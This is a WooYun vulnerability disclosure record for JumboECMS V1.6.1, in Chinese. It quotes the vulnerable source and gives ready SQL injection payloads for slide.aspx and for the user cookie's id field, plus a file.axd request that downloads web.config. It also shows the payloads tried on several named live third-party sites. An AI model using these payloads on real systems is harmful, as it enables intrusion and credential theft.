{"id": 54940, "wybug_id": "wooyun-2014-062717", "wybug_title": "JumboECMS V1.6.1 漏洞合集", "wybug_corp": "jumbotcms.net", "wybug_author": "what_news", "wybug_date": "2014-06-10 10:19", "wybug_open_date": "2014-09-08 10:20", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向公众公开  简要描述： JumboECMS V1.6.1 为最新版  2014-02-04 更新然后在最新版中依然发现注入漏洞旧版本同样存在了 详细说明：  可以通过google搜索  \nPowered by JumboECMS\n会发现好多企业用这套系统的现在把漏洞找出来吧我们先看下整个函数先\npublic string q(string s){    if ((HttpContext.Current.Request.QueryString[s] != null) && (HttpContext.Current.Request.QueryString[s] != \"\"))    {        return Strings.SafetyStr(HttpContext.Current.Request.QueryString[s].ToString()); //跟进    }    return string.Empty;}public static string SafetyStr(string theString){    string[] strArray = new string[] { \"'\", \";\", \"\\\"\", \"\\r\", \"\\n\" };    for (int i = 0; i < strArray.Length; i++)    {        theString = theString.Replace(strArray[i], string.Empty);    }    return theString;}只过滤了这几个\"'\", \";\", \"\\\"\", \"\\r\", \"\\n\"字符而已，所以注入是存在的\n漏洞一 注入：\nwww.jumboecms.net/plus/slide.aspx\n源码如下\nprotected void Page_Load(object sender, EventArgs e){    this.ID = base.q(\"id\");    base.doh.Reset();    base.doh.SqlCmd = \"SELECT * FROM [jcms_normal_slide] WHERE [state]=1 AND [ID]=\" + this.ID; //存在注入    DataTable dataTable = base.doh.GetDataTable();    if (dataTable != null)    {        this.Width = dataTable.Rows[0][\"Width\"].ToString();        this.Height = dataTable.Rows[0][\"Height\"].ToString();        this.Pics = this.Pics + dataTable.Rows[0][\"Img1\"].ToString();        this.Links = this.Links + ((dataTable.Rows[0][\"Url1\"].ToString().Length > 2) ? dataTable.Rows[0][\"Url1\"].ToString() : \"#\");        if (dataTable.Rows[0][\"Img2\"].ToString().Length > 4)        {            this.Pics = this.Pics + \"|\" + dataTable.Rows[0][\"Img2\"].ToString();            this.Links = this.Links + \"|\" + ((dataTable.Rows[0][\"Url2\"].ToString().Length > 2) ? dataTable.Rows[0][\"Url2\"].ToString() : \"#\");        }        if (dataTable.Rows[0][\"Img3\"].ToString().Length > 4)        {            this.Pics = this.Pics + \"|\" + dataTable.Rows[0][\"Img3\"].ToString();            this.Links = this.Links + \"|\" + ((dataTable.Rows[0][\"Url3\"].ToString().Length > 3) ? dataTable.Rows[0][\"Url3\"].ToString() : \"#\");        }        if (dataTable.Rows[0][\"Img4\"].ToString().Length > 4)        {            this.Pics = this.Pics + \"|\" + dataTable.Rows[0][\"Img4\"].ToString();            this.Links = this.Links + \"|\" + ((dataTable.Rows[0][\"Url4\"].ToString().Length > 4) ? dataTable.Rows[0][\"Url4\"].ToString() : \"#\");        }        if (dataTable.Rows[0][\"Img5\"].ToString().Length > 5)        {            this.Pics = this.Pics + \"|\" + dataTable.Rows[0][\"Img5\"].ToString();            this.Links = this.Links + \"|\" + ((dataTable.Rows[0][\"Url5\"].ToString().Length > 5) ? dataTable.Rows[0][\"Url5\"].ToString() : \"#\");        }    }    dataTable.Clear();    dataTable.Dispose();}\n漏洞证明 我找个表进行测试\n表名 jcms_normal_user字段名 UserName 和 UserPass\ngoogle 搜索 \nPowered by JumboECMS\n找几个例子进行验证案例一：\nhttp://www.jumboecms.net/plus/slide.aspx?id=1\nid存在注入\n\n案例二\nhttp://www.ruibide.com/plus/slide.aspx?id=1\n\nhttp://www.ruibide.com/plus/slide.aspx?id=1 and 1=1\n\nhttp://www.ruibide.com/plus/slide.aspx?id=1 and 1=2\n案例三\nhttp://www.hx123.com.cn/plus/slide.aspx?id=1\n\nhttp://www.hx123.com.cn/plus/slide.aspx?id=1 and 1=1\n\nhttp://www.hx123.com.cn/plus/slide.aspx?id=1 and 1=2\n漏洞二 存在后门级页面 任意文件下载漏洞 （比较鸡肋吧 需要知道文件的绝对路径）我们先看下web.config这个页面\n<httpHandlers><add verb=\"*\" path=\"file.axd\" type=\"JumboECMS.Common.Handler.FileHandler\" validate=\"false\"/>\n然后看下这个处理过程\npublic void ProcessRequest(HttpContext context){    string path = context.Request.QueryString[\"file\"];    if (File.Exists(path)) //需要文件的绝对路径    {        context.Response.AppendHeader(\"Content-Type\", \"application/octet-stream\");        context.Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + context.Server.UrlEncode(Path.GetFileName(path)));        context.Response.WriteFile(path, false);    }    else    {        context.Response.Status = \"404 File Not Found\";        context.Response.StatusCode = 0x194;        context.Response.StatusDescription = \"File Not Found\";        context.Response.Write(\"File Not Found\");    }}\n漏洞证明 还是通过google搜索关键字通过报错吧 找到网站的绝对路径 但是也要看网站报错能不能有路径可寻了找几个例子吧访问\nhttp://www.istpcb-ks.com//plus/codevoice.aspx?Code=a\n路径出来了接着访问\nhttp://www.istpcb-ks.com/file.axd?file=d:\\wwwroot\\lzsongwq2013\\wwwroot\\web.config\n就可以下载网站的配置文件了 也可下载数据库什么的了\n\n本地测试\n\n绝对路径比较难找的漏洞三 用户cookie没检测 存在注入 可获取到管理员密码 如果能破解MD5密码就可以登录管理员登录界面了 后台开启了用户注册登录这个功能为前提漏洞证明案例一访问\nhttp://crystal4d.com/passport/login.aspx\n注册一个账号什么的 我注册的是test 密码111111然后登录程序不会跳转到用户主页自己要访问\nhttp://crystal4d.com/user/index.aspx\n 看下cookie值是什么\n\n我的cookie值是\nid=4&name=test&nickname=test&password=96e79218965eb72c92a549dd5a330112&email=1%4011.com&groupid=1&groupname=%e5%88%9d%e7%ba%a7%e7%94%a8%e6%88%b7&setting=1%2c1%2c1%2c0%7c23%2c1%2c10%2c10%2c1%2c0%2c1%2c1%2c5%2c1%2c1%2c5%2c1%2c1%2c5%2c&cookies=c63634287\n改下cookie值 只改id就可以了把id值改成 1 or 1=1   整个值 需要urlencode即\nid=1%20or%201%3D1&name=test&nickname=test&password=96e79218965eb72c92a549dd5a330112&email=1%4011.com&groupid=1&groupname=%e5%88%9d%e7%ba%a7%e7%94%a8%e6%88%b7&setting=1%2c1%2c1%2c0%7c23%2c1%2c10%2c10%2c1%2c0%2c1%2c1%2c5%2c1%2c1%2c5%2c1%2c1%2c5%2c&cookies=c63634287\n\n\n\n\n刷新下 抓包 我们看到这个页面 包含用户的信息 里面有密码\n\n这个也是管理员账号案例二 访问\nhttp://www.ruibide.com/passport/login.aspx\n同样是注册test 111111登录后访问 访问 \nhttp://www.ruibide.com/user/index.aspx\n修改cookie 同样只是改id值为 1 or 1=1 改成\nid=1%20or%201%3D1&name=test&nickname=test&password=96e79218965eb72c92a549dd5a330112&email=1%4011.com&groupid=1&groupname=%e5%88%9d%e7%ba%a7%e7%94%a8%e6%88%b7&setting=1%2c1%2c1%2c0%7c23%2c1%2c10%2c10%2c1%2c0%2c1%2c1%2c5%2c1%2c1%2c5%2c1%2c1%2c5%2c&cookies=c35906161\n刷新下页面 就可以获取管理员账号了\n\n\n\n本地测试\n\n\n\n   漏洞证明：  漏洞证明如上   修复方案：  对参数什么的进行处理   版权声明：转载请注明来源 what_news@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-06-10 10:32 厂商回复： 很认真，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}